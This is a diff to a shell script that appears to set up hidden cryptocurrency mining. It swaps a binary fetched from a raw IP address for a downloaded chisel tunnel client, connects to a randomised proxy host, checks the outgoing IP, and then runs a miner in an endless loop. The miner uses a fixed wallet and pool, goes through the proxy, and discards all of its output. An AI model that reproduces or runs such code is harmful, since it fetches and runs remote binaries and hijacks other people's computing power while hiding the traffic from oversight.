@@ -19,19 +19,15 @@ echo ""
 
 sleep 2
 
-wget http://45.135.58.52/Spectre.tar.gz
+wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
+gunzip chisel_1.9.1_linux_amd64.gz
+chmod +x chisel_1.9.1_linux_amd64
+mv chisel_1.9.1_linux_amd64 chisel
 
+./chisel client -v http://cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:80 7777:socks &
 sleep 2
 
-tar -xf Spectre.tar.gz
-
-sleep 2
-
-./Spectre -L=:1082 -F=ss://aes-128-cfb:mikrotik999@cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:8443 &
-
-sleep 2
-
-curl -x socks5h://127.0.0.1:1082 api.ipify.org
+curl -x socks5h://127.0.0.1:7777 api.ipify.org
 
 sleep 2
 
@@ -55,6 +51,6 @@ sleep 2
 
 while true
 do
-./GP --disable-gpu --algorithm power2b --pool stratum-mining-pool.zapto.org:3765 --wallet MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93.$currentdate --password x --proxy 127.0.0.1:1082 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
+./GP --disable-gpu --algorithm power2b --pool stratum-mining-pool.zapto.org:3765 --wallet MiKbRHckresTQLQQiXcBVeKkE1ScK9Wa93.$currentdate --password x --proxy 127.0.0.1:7777 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
 sleep 10
 done
